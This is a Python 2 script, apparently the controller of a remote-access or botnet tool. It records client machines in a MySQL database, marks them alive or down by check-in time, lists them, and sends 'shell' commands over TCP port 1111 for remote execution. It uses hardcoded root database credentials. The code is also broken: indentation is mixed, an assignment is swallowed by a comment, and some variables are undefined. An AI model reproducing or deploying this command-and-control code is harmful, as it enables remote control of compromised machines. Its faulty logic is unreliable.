#!/usr/bin/env python
# coding: utf-8

import socket
import threading
import MySQLdb
import time
from time import gmtime, strftime

def check_alive():
	alive = []
	#Check if the hosts have been connected in the alst minute
	#If not, marked them as 'down'
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """SELECT uuid, last_alive FROM clients.clients WHERE status = 'Alive'""")
        rows = cursor.fetchall()
	db.close()

	if str(rows) == "()":
		print("[WARNING] All the clients seems down !")
	else:
		pass

	count_alive = 0
	for items in rows:
		element = str(items)

		for elem in element.split(','):
			count_alive += 1
			alive.append(elem)

			if '-' in elem:
				uuid_not_parse = str(elem)
				uuid = uuid_not_parse[2:38]

			if 'Alive' in elem:
				# print(str(count_alive) + elem)
				remote_date = str(elem).replace("Alive","")[:-2][3:29]
				local_date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())

				# récupère date entière du client et du server
				local_date_prefixe = local_date[0:13]
				remote_date_prefixe = remote_date[0:13]

				# comparaison va être faite avec le préfixe date + heure
#				print("R : " + remote_date)
#				print("L : " + local_date)

				local_date_minute = local_date[14:16]
                                remote_date_minute = remote_date[14:16]

				local_date_secondes = local_date[17:19]
				remote_date_secondes = remote_date[17:19]

				local_date_compare = local_date_minute + ":" + local_date_secondes
				remote_date_compare = remote_date_minute + ":" + remote_date_secondes

				local = time.strptime(local_date_compare, "%M:%S")
				remote = time.strptime(remote_date_compare, "%M:%S")

				min = int(local_date_minute) - int(remote_date_minute)
				sec = int(local_date_secondes) - int(remote_date_secondes)

				db = MySQLdb.connect("localhost","root","toor","clients")
                                cursor = db.cursor()
                                # Init connexion à la BDD				Hours_diff = True

				if str(local_date_prefixe) != str(remote_date_prefixe):
				# Si le client ne s'est pas connecté depuis plus d'1h ou plus
					Hours_diff = False
					db = MySQLdb.connect("localhost","root","toor","clients")
			        	cursor = db.cursor()
        				# Init connexion à la BDD

					cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Down',[uuid]))
		                        db.commit()
					print("[DEBUG] Client down : " + str(uuid))
					db.close()
					# Update le status du client à 'Down'

				if Hours_diff == True and min > 1:
					db = MySQLdb.connect("localhost","root","toor","clients")
                                        cursor = db.cursor()
                                        # Init connexion à la BDD

                                        cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Down',[uuid]))
                                        db.commit()
                                        print("[+] Client seems down : " + str(uuid))
                                        db.close()
                                        # Update le status du client à 'Down'

def send_cmd(remote_cmd,remote_client):
	# Need to take two args : The remote command and the remote host to interact with

#	print("[DEBUG] Sending command :" + str(remote_cmd))

	socket_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket_cmd.connect((str(remote_client), 1111))

	chaine = "shell " + str(remote_cmd)

	try:
		socket_cmd.send(chaine.encode())
		socket_cmd.close()
#		print("[DEBUG] Command send !")
	except:
		socket_cmd.close()
#		print("[DEBUG] Command not send, debug me !")

def who_is_alive():
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """select id,lip,computer from clients.clients""")
        rows = cursor.fetchall()
        db.close()
	array1 = []
	count_array = 0
	count = 0

	for elems in str(rows).split(","):
		array1.append(elems)
	for elems in array1:
		count_array += 1
	nb_elems = count_array / 3
	print(" ")
	print("[+] There is " + str(nb_elems) + " connected clients : ")

	if nb_elems == 1:
		chaine = str(result[1]) + " : " + str(result[2])
                print("[" + str(result[a]) + "] " + chaine)

	else:
		for result in rows:
			for x in range (0,nb_elems-1):
				a = x * 3
				b = a + 1
				c = b + 1
				d = x + 1
			chaine = str(result[b]) + " : " + str(result[c])
			print("[" + str(result[a]) + "] " + chaine)
		print(" ")

def who_is_alive_connected():
        db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """select id,lip,computer from clients.clients where status = 'Alive'""")
        rows = cursor.fetchall()
        db.close()
        array1 = []
        count_array = 0
        count = 0

        for elems in str(rows).split(","):
                array1.append(elems)
        for elems in array1:
                count_array += 1
        nb_elems = count_array / 3
        print(" ")
        print("[+] There is " + str(nb_elems) + " connected clients : ")

	if nb_elems == 0:
		print("[-] All clients seems down")


	elif nb_elems == 1:
		for result in rows:
			for x in range (0,nb_elems-1):
				chaine = str(result[1]) + " : " + str(result[2])
                		print("[" + str(result[0]) + "] " + chaine)

	else:
        	for result in rows:
	                for x in range (0,nb_elems-1):
        	                a = x * 3
        	                b = a + 1
        	                c = b + 1
        	                d = x + 1
        	        chaine = str(result[b]) + " : " + str(result[c])
        	        print("[" + str(result[a]) + "] " + chaine)
		print(" ")


#while True:
#	time.sleep(30)
#	check_alive()
